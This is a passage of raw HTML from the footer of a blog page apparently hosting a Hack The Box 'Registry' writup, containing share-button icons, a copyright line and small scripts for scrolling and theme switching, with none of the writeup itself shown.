13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox Writeup] Registry on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-registry%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox Writeup] Registry on whatsapp" href="https://api.whatsapp.com/send?text=%5bHackthebox%20Writeup%5d%20Registry%20-%20https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-registry%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [Hackthebox Writeup] Registry on telegram" href="https://telegram.me/share/url?text=%5bHackthebox%20Writeup%5d%20Registry&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fhackthebox-writeup-registry%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://minhtuanact.github.io/>minhtuanact|Blog - Keep a flame in the rain!</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>